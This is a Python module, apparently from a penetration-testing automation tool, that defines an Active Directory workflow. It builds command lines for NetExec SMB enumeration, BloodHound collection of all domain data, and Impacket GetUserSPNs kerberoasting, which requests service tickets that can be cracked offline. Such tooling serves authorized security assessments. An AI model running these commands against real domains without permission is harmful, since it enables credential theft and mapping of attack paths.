"""`ad` workflow: NetExec enumeration, BloodHound collection and Impacket
roasting. Credentialed steps run only when ``--user``/``--password`` are given;
otherwise they are recorded as skipped with guidance."""
from __future__ import annotations

from .. import runner
from .base import Task, Workflow, first_lines


def _nxc_summary(res: runner.Result) -> str:
    sigs = [l for l in res.stdout.splitlines() if "[+]" in l or "[*]" in l]
    return first_lines("\n".join(sigs) or res.stdout)


class ADWorkflow(Workflow):
    kind = "ad"
    description = "Active Directory enumeration & attack-path collection"

    def plan(self) -> list[Task]:
        domain = self.target
        user = self.extra.get("user")
        password = self.extra.get("password")
        dc = self.extra.get("dc_ip") or domain

        tasks = [
            Task("netexec-smb", ["netexec", "smb", dc], timeout=600, optional=True,
                 summarize=_nxc_summary),
        ]

        if user and password:
            tasks.append(Task(
                "bloodhound-python",
                ["bloodhound-python", "-d", domain, "-u", user, "-p", password,
                 "-dc", dc, "-c", "All", "--zip"],
                timeout=1800, optional=True,
            ))
            tasks.append(Task(
                "GetUserSPNs (kerberoast)",
                ["impacket-GetUserSPNs", "-dc-ip", dc, f"{domain}/{user}:{password}", "-request"],
                timeout=600, optional=True,
            ))
        else:
            tasks.append(Task(
                "credentialed-collection",
                note="skipped: pass --user/--password (and --dc-ip) for BloodHound + Impacket",
            ))
        return tasks
